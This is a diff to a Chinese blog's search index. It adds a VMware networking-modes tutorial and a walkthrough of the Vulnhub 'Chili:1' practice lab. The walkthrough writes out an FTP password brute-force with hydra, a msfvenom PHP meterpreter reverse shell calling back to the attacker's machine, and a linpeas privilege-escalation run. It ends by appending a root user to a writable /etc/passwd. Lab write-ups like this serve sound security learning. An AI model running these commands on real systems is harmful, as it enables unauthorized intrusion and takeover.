@@ -6255,4 +6255,158 @@ $res=unserialize(@$select);
         <category>hexo</category>
       </categories>
   </entry>
+  <entry>
+    <title>vmware三种网络工作模式</title>
+    <url>/2021/06/01/vmware%E4%B8%89%E7%A7%8D%E7%BD%91%E7%BB%9C%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/</url>
+    <content><![CDATA[<h1>vmware三种网络工作模式</h1>
+<p>转自:<a href="https://www.linuxidc.com/Linux/2016-09/135521.htm">https://www.linuxidc.com/Linux/2016-09/135521.htm</a></p>
+<p>vmware为我们提供了三种网络工作模式，它们分别是：<strong>Bridged（桥接模式）</strong>、<strong>NAT（网络地址转换模式）</strong>、<strong>Host-Only（仅主机模式）</strong>。</p>
+<p>打开vmware虚拟机，我们可以在选项栏的“编辑”下的“虚拟网络编辑器”中看到VMnet0（桥接模式）、VMnet1（仅主机模式）、VMnet8（NAT模式），那么这些都是有什么作用呢？其实，我们现在看到的VMnet0表示的是用于桥接模式下的虚拟交换机；VMnet1表示的是用于仅主机模式下的虚拟交换机；VMnet8表示的是用于NAT模式下的虚拟交换机。</p>
+<p><img src="https://www.linuxidc.com/upload/2016_09/160926204625482.png" alt="虚拟网络编辑器"></p>
+<p>同时，在主机上对应的有VMware Network Adapter VMnet1和VMware Network Adapter VMnet8两块虚拟网卡，它们分别作用于仅主机模式与NAT模式下。在“网络连接”中我们可以看到这两块虚拟网卡，如果将这两块卸载了，可以在vmware的“编辑”下的“虚拟网络编辑器”中点击“还原默认设置”，可重新将虚拟网卡还原。</p>
+<p><img src="https://www.linuxidc.com/upload/2016_09/160926204625483.png" alt="还原默认设置"></p>
+<p>小伙伴看到这里，肯定有疑问，为什么在真机上没有VMware Network Adapter VMnet0虚拟网卡呢？那么接下来，我们就一起来看一下这是为什么。</p>
+<h2 id="一、Bridged（桥接模式）"><a class="header-anchor" href="#一、Bridged（桥接模式）">¶</a>一、Bridged（桥接模式）</h2>
+<p>什么是桥接模式？桥接模式就是将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。在桥接的作用下，类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。其网络结构如下图所示：</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/14acd50fe89a84932f68f097befe0d5d.png" alt="桥接模式"></p>
+<p>接下来，我们就来实际操作，如何设置桥接模式。</p>
+<p>首先，安装完系统之后，在开启系统之前，点击“编辑虚拟机设置”来设置网卡模式。</p>
+<p>点击“网络适配器”，选择“桥接模式”，然后“确定”</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/584d7d199eda6c406db75ba3f1e081b9.png" alt="网络适配器"></p>
+<p>在进入系统之前，我们先确认一下主机的ip地址、网关、DNS等信息。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b8dfa83a47f1603ac5658be03bea949c.png" alt="主机信息"></p>
+<p>然后，进入系统编辑网卡配置文件，命令为vi /etc/sysconfig/network-scripts/ifcfg-eth0</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3d5cd52c0e3c5426fa13d38a9e5c2c33.png" alt="编辑网卡配置文件"></p>
+<p>添加内容如下：</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/a52bbfd90132b544824d58af99acbd0b.png" alt="添加内容"></p>
+<p>编辑完成，保存退出，然后重启虚拟机网卡，使用ping命令ping外网ip，测试能否联网。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d92ed70aa72075f498c2d4d2bc5b76fd.png" alt="测试能否联网"></p>
+<p>能ping通外网ip，证明桥接模式设置成功。</p>
+<p>那主机与虚拟机之间的通信是否正常呢？我们就用xshell来测试 发现主机与虚拟机通信正常。</p>
+<p>这就是桥接模式的设置步骤，相信大家应该学会了如何去设置桥接模式了。桥接模式配置简单，但如果你的网络环境是ip资源很缺少或对ip管理比较严格的话，那桥接模式就不太适用了。如果真是这种情况的话，我们该如何解决呢？接下来，我们就来认识vmware的另一种网络模式：NAT模式。</p>
+<h2 id="二、NAT（地址转换模式）"><a class="header-anchor" href="#二、NAT（地址转换模式）">¶</a>二、NAT（地址转换模式）</h2>
+<p><strong>路由器使用叫做NAT(网络地址转换)的方式，将它所接的外网数据包转发给内网的计算机（内网ip+端口），从而实现多个计算机上网。</strong><br>
+<strong>“路由器”作为一种世面售卖的硬件，其实不是单纯的路由器，而是集合了路由器、交换机、dhcp、nat、网关、dns、防火墙等功能的一种设备。</strong><br>
+<strong>你的网关是路由器作为内网的地址。你的公网ip是运营商分配给你的地址（路由器外网地址），你的计算机的地址，是路由器作为dhcp动态分配的内网地址。</strong></p>
+<p>刚刚我们说到，如果你的网络ip资源紧缺，但是你又希望你的虚拟机能够联网，这时候NAT模式是最好的选择。NAT模式借助虚拟NAT设备和虚拟DHCP服务器，使得虚拟机可以联网。其网络结构如下图所示：</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/60902cfd2471c23e71a5865dab19af90.png" alt="NAT模式"></p>
+<p>在NAT模式中，主机网卡直接与虚拟NAT设备相连，然后虚拟NAT设备与虚拟DHCP服务器一起连接在虚拟交换机VMnet8上，这样就实现了虚拟机联网。那么我们会觉得很奇怪，为什么需要虚拟网卡VMware Network Adapter VMnet8呢？原来我们的VMware Network Adapter VMnet8虚拟网卡主要是为了实现主机与虚拟机之间的通信。在之后的设置步骤中，我们可以加以验证。</p>
+<p>首先，设置虚拟机中NAT模式的选项，打开vmware，点击“编辑”下的“虚拟网络编辑器”，设置NAT参数及DHCP参数。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/cf9afd8affca8d2cf5b6d2b9b317ab4d.png" alt="虚拟网络编辑器"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/4c9b9d354b0709d9b9fd011198a8f970.png" alt="NAT参数"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/ca13ff157a76c3dbd326d4c46261ba93.png" alt="DHCP参数"></p>
+<p>将虚拟机的网络连接模式修改成NAT模式，点击“编辑虚拟机设置”。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/e091444b0667948492da425aa4f20541.png" alt="编辑虚拟机设置"></p>
+<p>点击“网络适配器”，选择“NAT模式”</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f75d5b63129d2c7c5376a5356391ff32.png" alt="NAT模式"></p>
+<p>然后开机启动系统，编辑网卡配置文件，命令为vi /etc/sysconfig/network-scripts/ifcfg-eth0</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/ec72cfa2e918ad4694aba19fcfc4d633.png" alt="编辑网卡配置文件"></p>
+<p>具体配置如下：</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/35b98681bf14a1d17c3f79203bd7e467.png" alt="具体配置"></p>
+<p>编辑完成，保存退出，然后重启虚拟机网卡，动态获取ip地址，使用ping命令ping外网ip，测试能否联网。</p>
+<p>之前，我们说过VMware Network Adapter VMnet8虚拟网卡的作用，那我们现在就来测试一下。</p>
+<p><img src="https://www.linuxidc.com/upload/2016_09/1609262046644510.png" alt="虚拟网卡禁用"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/167ff916fb40fde4a2984c513023d8b6.png" alt="是否能ping通"></p>
+<p>如此看来，虚拟机能联通外网，确实不是通过VMware Network Adapter VMnet8虚拟网卡，那么为什么要有这块虚拟网卡呢？</p>
+<p>之前我们就说VMware Network Adapter VMnet8的作用是主机与虚拟机之间的通信，接下来，我们就用远程连接工具来测试</p>
+<p>然后，将VMware Network Adapter VMnet8启用之后，发现远程工具 xshell可以连接上虚拟机了。</p>
+<p>那么，这就是NAT模式，利用虚拟的NAT设备以及虚拟DHCP服务器来使虚拟机连接外网，而VMware Network Adapter VMnet8虚拟网卡是用来与虚拟机通信的</p>
+<h2 id="三、Host-Only（仅主机模式）"><a class="header-anchor" href="#三、Host-Only（仅主机模式）">¶</a>三、Host-Only（仅主机模式）</h2>
+<p>Host-Only模式其实就是NAT模式去除了虚拟NAT设备，然后使用VMware Network Adapter VMnet1虚拟网卡连接VMnet1虚拟交换机来与虚拟机通信的，Host-Only模式将虚拟机与外网隔开，使得虚拟机成为一个独立的系统，只与主机相互通讯。其网络结构如下图所示：</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/ba1fcb83db4e9c83bccd02e4eaf68eb4.png" alt="Host-Only模式"></p>
+<p>通过上图，我们可以发现，如果要使得虚拟机能联网，我们可以将主机网卡共享给VMware Network Adapter VMnet1网卡，从而达到虚拟机联网的目的。接下来，我们就来测试一下。</p>
+<p>首先设置“虚拟网络编辑器”，可以设置DHCP的起始范围。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/7a1cf5c6e89043463a4d0524f7582121.png" alt="虚拟网络编辑器"></p>
+<p>设置虚拟机为Host-Only模式。</p>
+<p>开机启动系统，然后设置网卡文件。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6b36c40170113edfbec38b79ab344799.png" alt="设置网卡文件"></p>
+<p>保存退出，然后重启网卡，利用xshell测试能否与主机通信。</p>
+<p>发现主机与虚拟机之间可以通信，现在设置虚拟机联通外网。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/36103d480eb74a8cbaca3383d1151961.png" alt="设置虚拟机联通外网"></p>
+<p>我们可以看到上图有一个提示，强制将VMware Network Adapter VMnet1的ip设置成192.168.137.1，那么接下来，我们就要将虚拟机的DHCP的子网和起始地址进行修改，点击“虚拟网络编辑器”</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d63c7f1dd1ee6cd2213b8fbc47f0eac1.png" alt="虚拟网络编辑器"></p>
+<p>重新配置网卡，将VMware Network Adapter VMnet1虚拟网卡作为虚拟机的路由。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0de2b7f52e512efde510553c4e4bed4d.png" alt="重新配置网卡"></p>
+<p>重启网卡，然后通过 远程工具测试能否联通外网以及与主机通信。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d4a955bbc254388faa79565387c70ce6.png" alt="远程工具测试"></p>
+<p>测试结果证明可以使得虚拟机连接外网。</p>
+<p>以上就是关于VMware三种网络模式的工作原理及配置详解。</p>
+]]></content>
+      <categories>
+        <category>其它</category>
+        <category>vmware</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Vulnhub靶场练习</title>
+    <url>/2021/06/17/Vulnhub%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
+    <content><![CDATA[<h1>Vulnhub靶场练习</h1>
+<h2 id="Chili-1"><a class="header-anchor" href="#Chili-1">¶</a>Chili:1</h2>
+<h3 id="环境搭建"><a class="header-anchor" href="#环境搭建">¶</a>环境搭建</h3>
+<p><a href="https://www.vulnhub.com/entry/chili-1,558/">https://www.vulnhub.com/entry/chili-1,558/</a></p>
+<p>下载https://download.vulnhub.com/chili/Chili.ova  然后右键用vmware打开即可</p>
+<p>我这里使用的nat模式连接</p>
+<h3 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.94.197&#x2F;24</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210617123905206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -O -p-  192.168.94.247</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210617124251872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>发现开启了 21 ftp端口</p>
+<h3 id="正式开始"><a class="header-anchor" href="#正式开始">¶</a>正式开始</h3>
+<p>访问 ip的 80端口  发现啥也没有</p>
+<p>看到提示</p>
+<ul>
+<li>Hint : “If you ever get stuck, try again with the name of the lab”</li>
+</ul>
+<p>感觉是爆破ftp 获得密码</p>
+<p>账号就用提示的 chili</p>
+<p>密码脚本用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l chili -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -f -V ftp:&#x2F;&#x2F;192.168.94.247</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210617141246613.png" alt="在这里插入图片描述"></p>
+<p>发现了密码</p>
+<p>直接ftp登录吧</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftp 192.168.94.247</span><br></pre></td></tr></table></figure>
+<p>然后用 msf拿个shell</p>
+<p>进入网站根目录，发现有隐藏文件，且.nano是具有最高权限的目录文件，考虑在该目录下传入木马</p>
+<p>先生成木马</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter_reverse_tcp LHOST&#x3D;192.168.94.197 LPORT&#x3D;2233 -f raw  &gt; shell.php</span><br></pre></td></tr></table></figure>
+<p>然后将该木马传到靶机的.nano目录下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">put &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;shell.php  aa.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210617151500436.png" alt="在这里插入图片描述"></p>
+<p>目前aa.php没有可执行权限，给它赋予最高权限</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 777 aa.php</span><br></pre></td></tr></table></figure>
+<p>成功上传后，这里我们通过msf反弹shell，在kali端口开启端口监听，然后通过浏览器访问我们的木马：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload php&#x2F;meterpreter_reverse_tcp</span><br><span class="line">set LHOST 192.168.94.197</span><br><span class="line">set LPORT 2233</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>可以看到建立连接了</p>
+<p><img src="https://img-blog.csdnimg.cn/20210617151252649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>然后进入shell模式</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
+<p>切换交互式shell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br></pre></td></tr></table></figure>
+<p>看了看自己权限</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data</span><br></pre></td></tr></table></figure>
+<p>上传一个linux提权脚本</p>
+<p><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</a></p>
+<p><img src="https://img-blog.csdnimg.cn/20210617152517849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>使用ftp 上传</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">put  &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;privilege-escalation-awesome-scripts-suite-master&#x2F;privilege-escalation-awesome-scripts-suite-master&#x2F;linPEAS&#x2F;linpeas.sh  &#x2F;var&#x2F;www&#x2F;html&#x2F;.nano&#x2F;a.sh</span><br></pre></td></tr></table></figure>
+<p>然后再msf 终端  执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;a.sh</span><br></pre></td></tr></table></figure>
+<p>发现/etc/passwd对于其他用户有写的权限，这里我们可以直接添加一个高权限用户进去：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt salt l1yee</span><br><span class="line">$1$salt$6GXvLeiShroUP6WTte.ny&#x2F;</span><br><span class="line">echo &#39;salt:$1$salt$6GXvLeiShroUP6WTte.ny&#x2F;:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39;&gt;&gt;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/2021061715224489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>然后</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">su salt</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210617153511955.png" alt="在这里插入图片描述"></p>
+<p>成功获取 root权限</p>
+<p>参:<a href="https://www.cnblogs.com/zzjdbk/p/14096084.html">https://www.cnblogs.com/zzjdbk/p/14096084.html</a></p>
+<p><a href="https://www.cnblogs.com/sym945/p/13723537.html">https://www.cnblogs.com/sym945/p/13723537.html</a></p>
+<p><a href="https://blog.csdn.net/qq_42967398/article/details/108928297">https://blog.csdn.net/qq_42967398/article/details/108928297</a></p>
+<p><a href="https://blog.csdn.net/qq_40549070/article/details/108926099">https://blog.csdn.net/qq_40549070/article/details/108926099</a></p>
+]]></content>
+      <categories>
+        <category>刷题站</category>
+        <category>vulhub</category>
+      </categories>
+  </entry>
 </search>
